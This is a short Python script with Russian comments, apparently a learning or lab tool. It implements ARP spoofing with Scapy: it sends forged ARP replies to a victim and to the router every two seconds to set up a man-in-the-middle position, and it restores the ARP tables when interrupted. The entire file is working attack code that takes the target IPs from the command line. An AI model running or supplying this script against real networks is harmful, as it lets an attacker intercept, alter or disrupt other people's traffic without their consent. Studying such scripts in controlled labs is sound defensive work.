'''
Скрипт арп-спуфер. Отправляет арп-ответы как жертве с информацией, где мы выдаем себя за маршрутизатор, так и маршрутизатору, с ответом, где мы выдаем себя жертвой.
Получается атака MITM.
'''

from scapy.all import *
import sys

# Функция формирования арп ответа подмены
def arp_spoof(dest_ip, dest_mac, source_ip):
	# pdst - ip кому посылаем, hwdst - mac кому посылаем, psrc - айпи с которого якобы посылаем свой мак (за кого себя выдаем)
	packet= ARP(op="is-at", pdst= dest_ip, hwdst= dest_mac, psrc= source_ip)

	# Отправка пакета
	send(packet, verbose=False)

# Функция формирования арп ответа восстановления подмены
def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
	# To dest_ip dest_mac : source_ip is at source_mac
	packet= ARP(op="is-at", hwsrc=source_mac, psrc= source_ip, hwdst= dest_mac,
		pdst= dest_ip)

	# Отправка пакета
	send(packet, verbose=False)

def main():
	victim_ip= sys.argv[1] 
	router_ip= sys.argv[2]
	victim_mac = getmacbyip(victim_ip)
	router_mac = getmacbyip(router_ip)

	try:
		print("Sending spoofed ARP packets")
		print("Victim IP ", victim_ip, " | Victim MAC ", victim_mac, " | Router IP ", router_ip, " | ")
		print("Router IP ", router_ip, " | Router MAC ", router_mac, " | Victim IP ", victim_ip, " | ")
		while True:
			arp_spoof(victim_ip, victim_mac, router_ip) # отправляем таргету ответ якобы от роутера с его айпи, но своим мак
			arp_spoof(router_ip, router_mac, victim_ip) # отправляем роутеру ответ с айпи таргета, но своим мак
			time.sleep(2) # Не будем совмещать арп и дос атаку :)
	except KeyboardInterrupt:
		print("Restoring ARP tables")
		print("Router IP ", router_ip, " | Router MAC ", router_mac, " | Victim IP ", victim_ip, " | Victim MAC ", victim_mac, " | ")
		print("Victim IP ", victim_ip, " | Victim MAC ", victim_mac, " | Router IP ", router_ip, " | Router MAC ", router_mac, " | ")
		arp_restore(router_ip, router_mac, victim_ip, victim_mac) # сначала посылаем роутеру арп ответ с настоящим айпи и мак таргета
		arp_restore(victim_ip, victim_mac, router_ip, router_mac) # потом таргету арп ответ с настоящим айпи и мак роутера
		quit()
main()